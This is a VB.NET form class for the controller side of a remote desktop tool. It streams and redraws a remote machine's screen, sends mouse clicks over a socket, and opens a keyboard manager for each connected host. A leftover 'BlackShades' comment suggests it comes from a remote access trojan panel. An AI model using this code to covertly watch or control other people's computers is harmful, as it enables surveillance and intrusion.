Public Class RDP

    Public F As Main
    Public Sock As Integer
    Public Sz As Size
    Dim op As New Point(1, 1)
    Dim ee As System.Windows.Forms.KeyEventArgs
    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        If Button1.Text = "Start" Then
            F.S.Send(Sock, "@" & F.Yy & c1.SelectedIndex & F.Yy & c2.Text & F.Yy & c.Value)
            '
            Button1.Text = "Stop"
        Else
            Button1.Text = "Start"
        End If
    End Sub

    Public Sub PktToImage(ByVal BY As Byte())
        If Button1.Text = "Stop" Then
            F.S.Send(Sock, "@" & F.Yy & c1.SelectedIndex & F.Yy & c2.Text & F.Yy & c.Value)
        End If
        If CheckBox2.Checked = True Then
            If op = Nothing Then
            Else
                If Button1.Text = "Stop" Then
                    Dim pp As New Point(0, 0)
                    pp.X = op.X
                    pp.Y = op.Y
                    op = Nothing
                    F.S.Send(Sock, "$" & F.Yy & pp.X & F.Yy & pp.Y & F.Yy)
                End If

            End If
        End If
      
        Dim B As Array = fx(BY, "NsBl33D")
        Dim Q As New IO.MemoryStream(CType(B(1), Byte()))
        Dim L As Bitmap = Image.FromStream(Q)
        Dim QQ As String() = Split(BS(B(0)), ",")
        Try
            '  Me.BlackShadesNetForm1.Text = "Remote Desktop " & "Size: " & siz(BY.LongLength) & " ,Changes: " & QQ.Length - 2
        Catch ex As Exception
            Exit Try
        End Try
        Dim K As Bitmap = p1.Image.GetThumbnailImage(CType(Split(QQ(0), ".")(0), Integer), CType(Split(QQ(0), ".")(1), Integer), Nothing, Nothing)
        Dim G As Graphics = Graphics.FromImage(K)
        Dim tp As Integer = 0
        For i As Integer = 1 To QQ.Length - 2
            Dim P As New Point(Split(QQ(i), ".")(0), Split(QQ(i), ".")(1))
            Dim SZ As New Size(L.Width, Split(QQ(i), ".")(2))
            G.DrawImage(L.Clone(New Rectangle(0, tp, L.Width, CType(Split(QQ(i), ".")(2), Integer)), L.PixelFormat), New Point(CType(Split(QQ(i), ".")(0), Integer), CType(Split(QQ(i), ".")(1), Integer)))

            tp += SZ.Height
        Next
        G.Dispose()
        p1.Image = K
    End Sub

    Function QZ(ByVal q As Integer) As Size
        Dim zs As New Size(Sz)
        Select Case q
            Case 0
                Return Sz
            Case 1
                zs.Width = zs.Width / 1.1
                zs.Height = zs.Height / 1.1
            Case 2
                zs.Width = zs.Width / 1.3
                zs.Height = zs.Height / 1.3
            Case 3
                zs.Width = zs.Width / 1.5
                zs.Height = zs.Height / 1.5
            Case 4
                zs.Width = zs.Width / 1.9
                zs.Height = zs.Height / 1.9
            Case 5
                zs.Width = zs.Width / 2
                zs.Height = zs.Height / 2
            Case 6
                zs.Width = zs.Width / 2.1
                zs.Height = zs.Height / 2.1
            Case 7
                zs.Width = zs.Width / 2.2
                zs.Height = zs.Height / 2.2
            Case 8
                zs.Width = zs.Width / 2.5
                zs.Height = zs.Height / 2.5
            Case 9
                zs.Width = zs.Width / 3
                zs.Height = zs.Height / 3
            Case 10
                zs.Width = zs.Width / 3.5
                zs.Height = zs.Height / 3.5
            Case 11
                zs.Width = zs.Width / 4
                zs.Height = zs.Height / 4
            Case 12
                zs.Width = zs.Width / 5
                zs.Height = zs.Height / 5
            Case 13
                zs.Width = zs.Width / 6
                zs.Height = zs.Height / 6
        End Select
        zs.Width = Mid(zs.Width.ToString, 1, zs.Width.ToString.Length - 1) & 0
        zs.Height = Mid(zs.Height.ToString, 1, zs.Height.ToString.Length - 1) & 0
        Return zs
    End Function
    Private Sub RDP_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        For i As Integer = 0 To 13
            c1.Items.Add(QZ(i))
        Next
        For i As Integer = 1 To 10
            c2.Items.Add(i)
        Next
        p1.Image = New Bitmap(Sz.Width, Sz.Height)
        c1.SelectedIndex = 4
        c2.SelectedIndex = 4
        Timer1.Start()
    End Sub
    Private Sub CyberButton1_Click(sender As System.Object, e As System.EventArgs) Handles CyberButton1.Click
        Dim s As New SaveFileDialog
        s.Filter = "Pic|*.png"
        If s.ShowDialog = Windows.Forms.DialogResult.OK Then
            p1.Image.Save(s.FileName)
        End If
    End Sub

    Private Sub p1_MouseDown(sender As System.Object, e As System.Windows.Forms.MouseEventArgs) Handles p1.MouseDown
        If CheckBox2.Checked = True Then
            Dim PP = New Point(e.X * (Sz.Width / p1.Width), e.Y * (Sz.Height / p1.Height))
            Dim but As Integer
            If e.Button = Windows.Forms.MouseButtons.Left Then
                but = 2
            End If
            If e.Button = Windows.Forms.MouseButtons.Right Then
                but = 8
            End If
            F.S.Send(Sock, "#" & F.yy & PP.X & F.yy & PP.Y & F.yy & but)
        End If


    End Sub

    Private Sub p1_MouseUp(sender As Object, e As System.Windows.Forms.MouseEventArgs) Handles p1.MouseUp
        If CheckBox2.Checked = True Then
            Dim PP = New Point(e.X * (Sz.Width / p1.Width), e.Y * (Sz.Height / p1.Height))
            Dim but As Integer
            If e.Button = Windows.Forms.MouseButtons.Left Then
                but = 4
            End If
            If e.Button = Windows.Forms.MouseButtons.Right Then
                but = 16
            End If
            F.S.Send(Sock, "#" & F.yy & PP.X & F.yy & PP.Y & F.yy & but)
        End If


    End Sub

    Private Sub p1_MouseMove(sender As Object, e As System.Windows.Forms.MouseEventArgs) Handles p1.MouseMove
        If CheckBox2.Checked = True Then

            Dim PP = New Point(e.X * (Sz.Width / p1.Width), e.Y * (Sz.Height / p1.Height))
            If PP <> op Then
                op = PP

            End If

        End If

    End Sub
    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        Timer1.Enabled = False
        If op = Nothing Then
        Else
            If Button1.Text = "Stop" Then
                Dim pp As New Point(0, 0)
                pp.X = op.X
                pp.Y = op.Y
                op = Nothing
                ' F.S.Send(Sock, "$" & F.yy & pp.X & F.yy & pp.Y & F.yy)

                '    F.S.Send(Sock, "key" & F.yy & ee.KeyCode.LWin)
            End If
        End If
        Timer1.Enabled = True
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As System.Object, e As System.EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked = True Then


            Dim fx As KeyboardManager = My.Application.OpenForms("A" & Sock)
            If fx Is Nothing Then
                If Me.InvokeRequired Then
                    Me.Invoke(New Main._Data(AddressOf Main.Data), New Object() {Sock})
                    Exit Sub
                End If
                fx = New KeyboardManager
                fx.sock = Sock
                fx.Name = " " & Sock
                fx.Text += " " & " - " & Main.S.IP(Sock)
                fx.Show()
            End If




        End If
    End Sub

    Private Sub RDP_KeyDown(sender As System.Object, e As System.Windows.Forms.KeyEventArgs) Handles MyBase.KeyDown

    End Sub
End Class